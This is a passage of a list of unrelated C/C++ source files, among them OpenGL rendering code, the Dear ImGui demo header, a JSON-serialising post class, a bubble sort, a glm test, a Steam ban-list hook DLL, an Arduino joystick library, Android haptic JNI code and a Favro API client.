0),\n        glm::vec3(-1, 0, 0),\n\n        // Right\n        glm::vec3(1, 0, 0),\n        glm::vec3(1, 0, 0),\n        glm::vec3(1, 0, 0),\n        glm::vec3(1, 0, 0) };\n\n     // Specify indices - Triangles\n     indices = {\n         0, 1, 2, 0, 2, 3,        // Front\n         4, 5, 6, 4, 6, 7,        // Back\n         8, 9, 10, 8, 10, 11,     // Top\n         12, 13, 14, 12, 14, 15,  // Bottom\n         16, 17, 18, 16, 18, 19,  // Left\n         20, 21, 22, 20, 22, 23,  // Right\n     };\n\n\n     // Generate a vertex array (VAO) and two vertex buffer objects (VBO).\n     glGenVertexArrays(1, &VAO);\n     glGenBuffers(1, &VBO_positions);\n     glGenBuffers(1, &VBO_normals);\n\n     // Bind to the VAO.\n     glBindVertexArray(VAO);\n\n     // Bind to the first VBO - We will use it to store the vertices\n     glBindBuffer(GL_ARRAY_BUFFER, VBO_positions);\n     glBufferData(GL_ARRAY_BUFFER, sizeof(glm::vec3)* positions.size(), positions.data(), GL_STATIC_DRAW);\n     glEnableVertexAttribArray(0);\n     glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n     // Bind to the second VBO - We will use it to store the normals\n     glBindBuffer(GL_ARRAY_BUFFER, VBO_normals);\n     glBufferData(GL_ARRAY_BUFFER, sizeof(glm::vec3)* normals.size(), normals.data(), GL_STATIC_DRAW);\n     glEnableVertexAttribArray(1);\n     glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(GLfloat), 0);\n\n     // Generate EBO, bind the EBO to the bound VAO and send the data\n     glGenBuffers(1, &EBO);\n     glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n     glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(unsigned int)* indices.size(), indices.data(), GL_STATIC_DRAW);\n\n     // Unbind the VBOs.\n     glBindBuffer(GL_ARRAY_BUFFER, 0);\n     glBindVertexArray(0);\n}\n\nCube::~Cube() {\n    // Delete the VBOs and the VAO.\n    glDeleteBuffers(1, &VBO_positions);\n    glDeleteBuffers(1, &VBO_normals);\n    glDeleteBuffers(1, &EBO);\n    glDeleteVertexArrays(1, &VAO);\n}\n\nvoid Cube::draw(const glm::mat4& viewProjMtx, Shader* shader) {\n    // Activate the shader program\n    //shader->activate();\n\n    // get the locations and send the uniforms to the shader\n    print_world();\n    shader->set_mat4(\"viewProj\", (float*)&viewProjMtx);\n    //shader->set_mat4(\"model\", (float*)&model);\n    shader->set_vec3(\"DiffuseColor\", &color[0]);\n\n    // Bind the VAO\n    glBindVertexArray(VAO);\n\n    // Draw the points using triangles, indexed with the EBO\n    glDrawElements(GL_TRIANGLES, (int)indices.size(), GL_UNSIGNED_INT, 0);\n\n    // Unbind the VAO and shader program\n    glBindVertexArray(0);\n    //glUseProgram(0);\n}\n\nvoid Cube::print_world() {\n\tstd::cout << \"Cube world matrix: \" << std::endl;\n\tfor (int i = 0; i < 4; i++) {\n\t\tstd::cout << m",
    "// dear imgui, v1.90.2 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Examp",
    "\n#include \"Post.h\"\n\nPost::Post\n(void)\n{\n  this->class_name = \"Post\";\n\n  this->author = NULL;\n  this->msg = NULL;\n\n  // very critical ==> portable to different platforms\n  this->receivers = NULL;\n  this->links = NULL;\n  this->actions = NULL;\n  this->reactions = NULL;\n  this->comments = NULL;\n  this->created = NULL;\n  this->keys = NULL;\n  this->updated = NULL;\n  this->location = NULL;\n  this->is_published = false;\n}\n\nPost::Post\n(Person * arg_author, Message * arg_msg)\n{\n  this->class_name = \"Post\";\n\n  this->author = arg_author;\n  this->msg = arg_msg;\n\n  // very critical ==> portable to different platforms\n  this->receivers = NULL;\n  this->links = NULL;\n  this->actions = NULL;\n  this->reactions = NULL;\n  this->comments = NULL;\n  this->created = NULL;\n  this->keys = NULL;\n  this->updated = NULL;\n  this->location = NULL;\n  this->is_published = false;\n}\n\nPost::~Post\n(void)\n{\n  if (this->author != NULL) delete this->author;\n  if (this->msg != NULL) delete this->msg;\n  if (this->created != NULL) delete this->created;\n  if (this->updated != NULL) delete this->updated;\n  if (this->location != NULL) delete this->location;\n\n  int i;\n\n  // this->reactions\n  if (this->reactions != NULL)\n    {\n      for (i = 0; i < (this->reactions)->size(); i++)\n\t{\n\t  Reaction *r_ptr = (*(this->reactions))[i];\n\t  if (r_ptr != NULL)\n\t    {\n\t      delete r_ptr;\n\t    }\n\t}\n      delete this->reactions;\n    }\n\n  // this->receivers\n  if (this->receivers != NULL)\n    {\n      for (i = 0; i < (this->receivers)->size(); i++)\n\t{\n\t  Person *p_ptr = (*(this->receivers))[i];\n\t  if (p_ptr != NULL)\n\t    {\n\t      delete p_ptr;\n\t    }\n\t}\n      delete this->receivers;\n    }\n\n  // this->links\n  if (this->links != NULL)\n    {\n      for (i = 0; i < (this->links)->size(); i++)\n\t{\n\t  Link *l_ptr = (*(this->links))[i];\n\t  if (l_ptr != NULL)\n\t    {\n\t      delete l_ptr;\n\t    }\n\t}\n      delete this->links;\n    }\n\n  // this->actions\n  if (this->actions != NULL)\n    {\n      for (i = 0; i < (this->actions)->size(); i++)\n\t{\n\t  Action *a_ptr = (*(this->actions))[i];\n\t  if (a_ptr != NULL)\n\t    {\n\t      delete a_ptr;\n\t    }\n\t}\n      delete this->actions;\n    }\n\n  // this->comments;\n  if (this->comments != NULL)\n    {\n      for (i = 0; i < (this->comments)->size(); i++)\n\t{\n\t  Comment *c_ptr = (*(this->comments))[i];\n\t  if (c_ptr != NULL)\n\t    {\n\t      delete c_ptr;\n\t    }\n\t}\n      delete this->comments;\n    }\n  \n  // this->keys\n  if (this->keys != NULL)\n    {\n      for (i = 0; i < (this->keys)->size(); i++)\n\t{\n\t  OKey *o_ptr = (*(this->keys))[i];\n\t  if (o_ptr != NULL)\n\t    {\n\t      delete o_ptr;\n\t    }\n\t}\n      delete this->keys;\n    }\n}\n\nbool\nPost::operator==\n(Post aPost)\n{\n  return (this->id == aPost.id);\n}\n\nJson::Value *\nPost::dump2JSON\n(void)\n{\n  int i;\n\n  Json::Value * result_ptr = new Json::Value();\n  Json::Value * dumpjv_ptr = NULL;\n\n  // \"keys\"\n  if ((this->keys != NULL) &&\n      ((this->keys)->size() > 0))\n    {\n      Json::Value json_keys;\n      Json::Value json_keys_array;\n\n      for (i = 0; i < (this->keys)->size(); i++)\n\t{\n\t  dumpjv_ptr = ((*(this->keys))[i])->dump2JSON();\n\t  if (dumpjv_ptr != NULL)\n\t    {\n\t      json_keys[i] = *(dumpjv_ptr);\n\t    }\n\t  delete dumpjv_ptr;\n\t}\n      json_keys_array[\"data\"] = json_keys;\n      json_keys_array[\"count\"] = ((int) (*(this->keys)).size());\n      (*result_ptr)[\"keys\"] = json_keys_array;\n    }\n  \n  // \"actions\"\n  if ((this->actions != NULL) &&\n      ((this->actions)->size() > 0))\n    {\n      Json::Value json_actions;\n      Json::Value json_actions_array;\n\n      for (i = 0; i < (this->actions)->size(); i++)\n\t{\n\t  dumpjv_ptr = ((*(this->actions))[i])->dump2JSON();\n\t  if (dumpjv_ptr != NULL)\n\t    {\n\t      json_actions[i] = *(dumpjv_ptr);\n\t    }\n\t  delete dumpjv_ptr;\n\t}\n      json_actions_array[\"data\"] = json_actions;\n      json_actions_array[\"count\"] = ((int) (*(this->actions)).size());\n      (*result_ptr)[\"actions\"] = json_actions_array;\n    }\n  \n  // \"comments\"\n  if ((this->comments != NULL) &&\n      ((this->comments)->size() > 0))\n    {\n      Json::Value json_comments;\n      Json::Value json_comments_array;\n      for (i = 0; i < (this->comments)->size(); i++)\n\t{\n\t  dumpjv_ptr = ((*(this->comments))[i])->dump2JSON();\n\t  if (dumpjv_ptr != NULL)\n\t    {\n\t      json_comments[i] = (*dumpjv_ptr);\n\t    }\n\t  delete dumpjv_ptr;\n\t}\n      json_comments_array[\"data\"] = json_comments;\n      json_comments_array[\"count\"] = ((int) (*(this->comments)).size());\n      (*result_ptr)[\"comments\"] = json_comments_array;\n    }\n\n  // \"links\"\n  if ((this->links != NULL) &&\n      ((this->links)->size() > 0))\n    {\n      Json::Value json_links;\n      Json::Value json_links_array;\n      for (i = 0; i < (this->links)->size(); i++)\n\t{\n\t  dumpjv_ptr = ((*(this->links))[i])->dump2JSON();\n\t  if (dumpjv_ptr != NULL)\n\t    {\n\t      json_links[i] = (*dumpjv_ptr);\n\t    }\n\t  delete dumpjv_ptr;\n\t}\n      json_links_array[\"data\"] = json_links;\n      json_links_array[\"count\"] = ((int) (*(this->links)).size());\n      (*result_ptr)[\"links\"] = json_links_array;\n    }\n\n",
    "/******************************************************************************\n *\n * Sorts a sequence of strings from standard input using bubble sort\n *\n * Based on the source code from Robert Sedgewick and Kevin Wayne at https://algs4.cs.princeton.edu/\n *\n *      % more tiny.txt\n *      S O R T E X A M P L E\n *\n *      % ./bubble_sort < ../data/tiny.txt\n *      A E E L M O P R S T X                 [ one string per line ]\n *\n *      % more words3.txt\n *      bed bug dad yes zoo ... all bad yet\n *\n *      % ./bubble_sort < ../data/words3.txt\n *      all bad bed bug dad ... yes yet zoo   [ one string per line ]\n * \n ******************************************************************************/\n\n#include <iostream>\n#include <string>\n#include \"sort.h\"\n\n#define MAX_STR 100 // maximum number of strings\n\nusing namespace std;\n\nint main(void) {\n    string val[MAX_STR];\n    int no_of_strings = 0;\n\n    // read the strings from standard input\n    while ((no_of_strings < MAX_STR) && (cin >> val [no_of_strings])) {\n        no_of_strings++;\n    }\n\n    // sort the strings\n    bubble_sort(val, no_of_strings);\n\n    // print the sorted strings\n    for (auto i = 0; i < no_of_strings; i++) {\n        cout << val[i] << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}",
    "#include <glm/gtc/matrix_inverse.hpp>\n#include <glm/gtc/epsilon.hpp>\n\nstatic int test_affine()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::mat3 const M(\n\t\t\t2.f, 0.f, 0.f,\n\t\t\t0.f, 2.f, 0.f,\n\t\t\t0.f, 0.f, 1.f);\n\t\tglm::mat3 const A = glm::affineInverse(M);\n\t\tglm::mat3 const I = glm::inverse(M);\n\t\tglm::mat3 const R = glm::affineInverse(A);\n\n\t\tfor(glm::length_t i = 0; i < A.length(); ++i)\n\t\t{\n\t\t\tError += glm::all(glm::epsilonEqual(M[i], R[i], 0.01f)) ? 0 : 1;\n\t\t\tError += glm::all(glm::epsilonEqual(A[i], I[i], 0.01f)) ? 0 : 1;\n\t\t}\n\t}\n\n\t{\n\t\tglm::mat4 const M(\n\t\t\t2.f, 0.f, 0.f, 0.f,\n\t\t\t0.f, 2.f, 0.f, 0.f,\n\t\t\t0.f, 0.f, 2.f, 0.f,\n\t\t\t0.f, 0.f, 0.f, 1.f);\n\t\tglm::mat4 const A = glm::affineInverse(M);\n\t\tglm::mat4 const I = glm::inverse(M);\n\t\tglm::mat4 const R = glm::affineInverse(A);\n\n\t\tfor(glm::length_t i = 0; i < A.length(); ++i)\n\t\t{\n\t\t\tError += glm::all(glm::epsilonEqual(M[i], R[i], 0.01f)) ? 0 : 1;\n\t\t\tError += glm::all(glm::epsilonEqual(A[i], I[i], 0.01f)) ? 0 : 1;\n\t\t}\n\t}\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_affine();\n\n\treturn Error;\n}\n",
    "#include \"FileManager.h\"\n\nFileManager::FileManager(std::string filepath)\n{\n    this->_fs = std::fstream(filepath);\n    if (!this->_fs.is_open())\n    {\n        std::cerr << \"[Error:file] The file \" << filepath << \" can't be openned\" << std::endl;\n        throw std::runtime_error(\"Can't open the file\");\n    }\n}\n\nFileManager::~FileManager()\n{\n    this->_fs.close();\n}\n\nint FileManager::insertInFile(std::string data, int line)\n{\n    if(line < 0){\n        std::cout << \"Inserting data at the end of the file\" << std::endl;\n        this->_fs << data << std::endl;\n        return 0;\n    }\n\n    std::cout << \"Inserting data in line \" << line << std::endl;\n    if (!this->_fs)\n    {\n        std::cout << \"[Error:file] No file stream\" << line << std::endl;\n        throw std::runtime_error(\"[Error:file] No file stream\");\n    }\n\n    std::vector<std::string> lines;\n    std::string temp;\n    while (std::getline(this->_fs, temp))\n    {\n        lines.push_back(temp);\n    }\n\n    if (line < 0 || line > lines.size())\n    {\n        std::cout << \"[Error:file] The line number is out of range\" << std::endl;\n        throw std::runtime_error(\"[Error:file] The line number is out of range\");\n    }\n\n    lines.insert(lines.begin() + line, data);\n\n    this->_fs.clear();\n    this->_fs.seekp(0, std::ios::beg);\n    for (auto &l : lines)\n    {\n        this->_fs << l << std::endl;\n    }\n\n\n\n\n    return 0;\n}\n",
    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <filesystem>\n#include <fstream>\n#include <vector>\n#include <map>\n\n#define CON_LOG_PREFIX \"[SteamBans] \"\n#include \"Console.h\"\n\n//Ignore error 4996\n#pragma comment(lib, \"steam_api64.lib\")\n#pragma warning(disable: 4996)\n#include <steam/steam_api.h>\n\nstruct g_ctx\n{\n    std::atomic_bool running;\n    HANDLE hUnloadEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Signal to unload\n    HANDLE hUnloadEventAck = CreateEvent(NULL, TRUE, FALSE, NULL);\n    HMODULE hModule;\n    void* vftable_SteamNetConnectionStatusChanged;\n    std::vector<unsigned long long> banned_steamids = {};\n} Context;\n\nFARPROC GetProcAddressEx(const HMODULE hModule, const std::string lpProcName)\n{\n    const FARPROC pfnProc = GetProcAddress(hModule, lpProcName.c_str());\n    const auto lpProcNameW = std::wstring(lpProcName.begin(), lpProcName.end());\n    if (!pfnProc)\n    {\n        const auto msg = std::format(TEXT(\"Could not find export {}!\"), lpProcNameW);\n        MessageBox(NULL, msg.c_str(), TEXT(\"Error\"), MB_OK | MB_ICONERROR);\n        FreeLibraryAndExitThread(Context.hModule, NULL);\n        return nullptr;\n    }\n\n    return pfnProc;\n}\nvoid onSteamNetConnectionStatusChanged(std::uintptr_t self, SteamNetConnectionStatusChangedCallback_t* pParam);\ndecltype(&onSteamNetConnectionStatusChanged) oSteamNetConnectionStatusChanged;\n\nbool IsBannedSteamID(const std::uint64_t steamid)\n{\n    return std::find(Context.banned_steamids.begin(), Context.banned_steamids.end(), steamid) != Context.banned_steamids.end();\n}\n\nvoid onSteamNetConnectionStatusChanged(std::uintptr_t self, SteamNetConnectionStatusChangedCallback_t* pParam)\n{\n    const std::uint64_t connectionSteamID = pParam->m_info.m_identityRemote.GetSteamID64();\n    if (IsBannedSteamID(connectionSteamID))\n    {\n        if (pParam->m_info.m_eState == k_ESteamNetworkingConnectionState_Connecting)\n        {\n            DebugOutL(std::format(TEXT(\"Banned SteamID tried to join: {}\"), connectionSteamID));\n            SteamNetworkingSockets()->CloseConnection(pParam->m_hConn, 0, \"You are banned!\", false);\n        }\n        return;\n    }\n\n    return oSteamNetConnectionStatusChanged(self, pParam);\n}\n\nvoid UpdateBanList()\n{\n    // Make or open steamid ban list in the same directory as the process\n    std::filesystem::path path = std::filesystem::current_path() / \"steam_bans.txt\";\n\n    // Create the file if it doesn't exist\n    if (!std::filesystem::exists(path))\n    {\n        std::ofstream file(path);\n        file << \"# Put your banned steamids here\\n\";\n        file << \"# Each steamid should be on a new line\\n\";\n        file << \"# For example:\\n\";\n        file << \"76561199531536640 # TheGuy920's crash bot\\n\";\n        file << \"76561199665208613 # TheGuy920's crash bot #2\\n\";\n        file.close();\n    }\n\n    Context.banned_steamids.clear();\n    DebugOutL(\"Fetching banned users from steam_bans.txt...\");\n\n    // Each steamid should be on a new line\n    std::ifstream file(path);\n    std::string line;\n    while (std::getline(file, line))\n    {\n        if (line.size() < 17)\n            continue;\n\n        // Ensure 17 numerical digits\n        if (!std::all_of(line.begin(), line.begin() + 17, ::isdigit))\n            continue;\n\n        // Convert the string to a steamid\n        const std::uint64_t steamid64 = std::stoull(line);\n\n        DebugOutL(\"Added SteamID to banned list: \", steamid64);\n\n        Context.banned_steamids.push_back(steamid64);\n    }\n    file.close();\n}\n\nvoid SetupChangeNotifications()\n{\n    HANDLE hNotification = FindFirstChangeNotification(\n        std::filesystem::current_path().c_str(),\n        FALSE,\n        FILE_NOTIFY_CHANGE_LAST_WRITE\n    );\n\n    if (hNotification == INVALID_HANDLE_VALUE)\n    {\n        MessageBox(NULL, TEXT(\"Could not setup change notifications!\"), TEXT(\"Error\"), MB_OK | MB_ICONERROR);\n        FreeLibraryAndExitThread(Context.hModule, NULL);\n        return;\n    }\n\n    std::filesystem::file_time_type last_write_time_old = std::filesystem::last_write_time(std::filesystem::current_path() / \"steam_bans.txt\");\n    HANDLE handles[2] = { hNotification, Context.hUnloadEvent };\n\n    while (Context.running)\n    {\n        auto last_result = WaitForMultipleObjects(2, handles, FALSE, 100);\n        if (last_result == WAIT_OBJECT_0)\n        {\n            // Check if steamid ban list has been updated\n            std::filesystem::file_time_type last_write_time = std::filesystem::last_write_time(std::filesystem::current_path() / \"steam_bans.txt\");\n            if (last_write_time != last_write_time_old)\n            {\n                UpdateBanList();\n                last_write_time_old = last_write_time;\n            }\n        }\n        else if (last_result == WAIT_OBJECT_0 + 1)\n        {\n            break;\n        }\n    }\n\n    FindCloseChangeNotification(hNotification);\n    SetEvent(Context.hUnloadEventAck);\n    FreeLibraryAndExitThread(Context.hModule, NULL);\n}\n\nstd::uint64_t FollowJMP(std::uintptr_t address)\n{\n    const std::int32_t offset =",
    "/**\n * \\copyright  Copyright 2024 juskim. All rights reserved.\n *             The code for this project follow the Apache 2.0 license and details \n *             are provided in the LICENSE file located in the root folder of this \n *             project. Details of SOUP used in this project can also be found in \n *             the SOUP file located in the root folder.\n * \n * @file       joystick_lib.cpp\n * @author     juskim (GitHub: jus-kim, YouTube: @juskim)\n * @brief      Generic joystick library.\n *\n * @internal\n * This is an internal implementation command.\n * @endinternal\n */\n\n\n#include \"joystick_lib.h\"\n\n\n#define RAD_TO_DEG 57.2958\n\n\njoystick_lib::joystick_lib(void)\n{\n  pinMode(profile.joystick_pin_click, INPUT_PULLUP);\n}\n\nint joystick_lib::get_xy_adc(int &adc_x, int &adc_y)\n{\n  adc_x = analogRead(JOYSTICK_PIN_X);\n  adc_y = analogRead(JOYSTICK_PIN_Y);\n\n  return 0;\n}\n\nint joystick_lib::get_xy_percent(int &percent_x, int &percent_y)\n{\n  int adc_x, adc_y;\n\n  get_xy_adc(adc_x, adc_y);\n\n  percent_x = (int)(((float)adc_x / adc_max) * 200) - 99.0;\n  percent_y = (int)(((float)adc_y / adc_max) * 200) - 101.0;\n\n  if (percent_x <= -99) {\n    percent_x = -100;\n  } else if (percent_x >= 99) {\n    percent_x = 100;\n  }\n  if (percent_y <= -99) {\n    percent_y = -100;\n  } else if (percent_y >= 99) {\n    percent_y = 100;\n  }\n\n  return 0;\n}\n\n//\n//  A+W  W  W+D\n//     \\ | /\n//   A -   - D\n//     / | \\\n//  A+S  S  S+D\n//\nint joystick_lib::get_direction_keys(int percent_x, int percent_y, joystick_keys_s &joystick_keys)\n{\n  int radius_squared;\n\n  joystick_keys.key_state_up = false;     // Forward\n  joystick_keys.key_state_left = false;   // Left\n  joystick_keys.key_state_down = false;   // Backward\n  joystick_keys.key_state_right = false;  // Right\n  joystick_keys.key_state_walk = false;   // Walking\n\n  // Check if outside of rest zone\n  radius_squared = sq(percent_x) + sq(percent_y);\n  if (radius_squared >= rest_radius_max_squared)\n  {\n    // Check if in walking zone\n    if (radius_squared <= walking_radius_max_squared) {\n      joystick_keys.key_state_walk = true;\n    }\n  }\n  else\n  {\n    // User is not using the joystick; return\n    return 0;\n  }\n\n  // Get direction angle and determine key(s) pressed\n  float angle_rad = atan2(percent_y, percent_x);\n  float angle_deg = angle_rad * RAD_TO_DEG;  // NOTE: I really don't want to deal with rads... :)\n  if ((angle_deg <= KEY_DEG_RIGHT + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) && (angle_deg >= KEY_DEG_RIGHT - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_right = true;\n  }\n  if ((angle_deg <= KEY_DEG_UP + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) && (angle_deg >= KEY_DEG_UP - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_up = true;\n  }\n  if ((angle_deg <= -KEY_DEG_LEFT + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) || (angle_deg >= KEY_DEG_LEFT - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_left = true;\n  }\n  if ((angle_deg <= KEY_DEG_DOWN + (KEY_DEG_LIMITS + KEY_DEG_OVERLAP)) && (angle_deg >= KEY_DEG_DOWN - (KEY_DEG_LIMITS + KEY_DEG_OVERLAP))) {\n    joystick_keys.key_state_down = true;\n  }\n\n  return 0;\n}\n\nint joystick_lib::get_click(bool &click)\n{\n  click = digitalRead(profile.joystick_pin_click);\n  click = !click;  // Need to do opposite since pulled-high at resting\n\n  return 0;\n}\n\nint joystick_lib::press_keys(bool click, joystick_keys_s joystick_keys)\n{\n#if JOYSTYICK_AUTO_WALK_ENABLED == 1\n  // Press special key if within walking zone\n  if (joystick_keys.key_state_walk == true) {\n    Keyboard.press(joystick_keys.key_map_walk);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_walk);\n  }\n#endif\n\n  // Press/release joystick direction keys\n  if (joystick_keys.key_state_up == true) {\n    Keyboard.press(joystick_keys.key_map_up);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_up);\n  }\n  if (joystick_keys.key_state_left == true) {\n    Keyboard.press(joystick_keys.key_map_left);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_left);\n  }\n  if (joystick_keys.key_state_down == true) {\n    Keyboard.press(joystick_keys.key_map_down);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_down);\n  }\n  if (joystick_keys.key_state_right == true) {\n    Keyboard.press(joystick_keys.key_map_right);\n  }\n  else {\n    Keyboard.release(joystick_keys.key_map_right);\n  }\n\n  // Press/release joystick click key\n  if (click == true) {\n    Keyboard.press(joystick_keys.key_map_click);\n  } else {\n    Keyboard.release(joystick_keys.key_map_click);\n  }\n}\n\nint joystick_lib::run_tasks(void)\n{\n  int percent_x, percent_y;\n  bool click;\n  joystick_keys_s joystick_keys;\n\n  get_xy_percent(percent_x, percent_y);\n  get_direction_keys(percent_x, percent_y, joystick_keys);\n  get_click(click);\n  press_keys(click, joystick_keys);\n\n  /*Serial.print(joystick_keys.key_state_up);\n  Serial.print(joystick_keys.key_state_left);\n  Serial.print(joystick_keys.key_state_down);\n  Serial.print(joystick_keys.key_state_right);\n  Serial.println(click);*/\n}\n",
    "/* Aerials Haptic Feedback Android Implementation */\r\n#ifdef DM_PLATFORM_ANDROID\r\n#include <dmsdk/sdk.h>\r\n\r\n\r\n// You know, JNI is a piece of terrible sh*t\r\n// This function is from \"adamwestman/extension-vibrate\", under the MIT License.\r\ninline jclass GetClass(JNIEnv* env, const char* classname) {\r\n\tjclass activity_class = env->FindClass(\"android/app/NativeActivity\");\r\n\tjmethodID get_class_loader = env->GetMethodID(activity_class,\"getClassLoader\", \"()Ljava/lang/ClassLoader;\");\r\n\tjobject cls = env->CallObjectMethod(dmGraphics::GetNativeAndroidActivity(), get_class_loader);\r\n\tjclass class_loader = env->FindClass(\"java/lang/ClassLoader\");\r\n\tjmethodID find_class = env->GetMethodID(class_loader, \"loadClass\", \"(Ljava/lang/String;)Ljava/lang/Class;\");\r\n\tjstring str_class_name = env->NewStringUTF(classname);\r\n\tjclass outcls = (jclass)env->CallObjectMethod(cls, find_class, str_class_name);\r\n\tenv->DeleteLocalRef(str_class_name);\r\n\treturn outcls;\r\n}\r\n\r\n\r\nvoid AcUtilDoHapticFeedback() {\r\n\r\n\t// Attach VM & Env\r\n\tJNIEnv* Env;\r\n\tJavaVM* VM = dmGraphics::GetNativeAndroidJavaVM();\r\n\t\t\tVM-> AttachCurrentThread(&Env, NULL);\r\n\r\n\t// Call Class Method\r\n\tjclass hClass = GetClass(Env, \"com.acutil.haptic.HapticExtension\");\r\n\tjmethodID DHF = Env -> GetStaticMethodID(hClass, \"DoHapticFeedback\", \"(Landroid/app/Activity;)V\");\r\n\tEnv -> CallStaticVoidMethod( hClass, DHF, dmGraphics::GetNativeAndroidActivity() );\r\n\r\n\t// Clean Up\r\n\tEnv -> ExceptionClear();\r\n\tVM -> DetachCurrentThread();\r\n\r\n}\r\n\r\n\r\n#endif",
    "\ufeff#include \"FavroMessenger.h\"\n\n#include \"F2UESettings.h\"\n#include \"F2UEStyle.h\"\n#include \"HttpModule.h\"\n#include \"FavroTypes.h\"\n#include \"Interfaces/IHttpResponse.h\"\n#include \"Misc/Base64.h\"\n#include \"Serialization/JsonReader.h\"\n#include \"Serialization/JsonSerializer.h\"\n\nvoid FFavroMessenger::PrepareRequest(const FString& Route, const bool bWithOrgId,\n                                     TSharedRef<IHttpRequest, ESPMode::ThreadSafe>& Request,\n                                     const FFavroRequestArgs& Args)\n{\n\tFString ParsedArgs;\n\n\tif (!Args.IsEmpty())\n\t{\n\t\tParsedArgs.Append(\"?\");\n\t\tfor (auto& [Arg, Value] : Args)\n\t\t{\n\t\t\tParsedArgs.Append(FString::Printf(TEXT(\"&%s=%s\"), *Arg, *Value));\n\t\t}\n\t}\n\n\tRequest->SetURL(ApiUrl + Route + ParsedArgs);\n\n\tRequest->SetHeader(TEXT(\"User-Agent\"), \"X-UnrealEngine-Agent\");\n\tRequest->SetHeader(TEXT(\"Content-Type\"), \"application/json\");\n\n\t// Basic Auth\n\tconst FString UserCredentials = FString::Printf(TEXT(\"%s:%s\"), *Settings->Username, *Settings->ApiToken);\n\tconst FString AuthorizationHeader = TEXT(\"Basic \") + 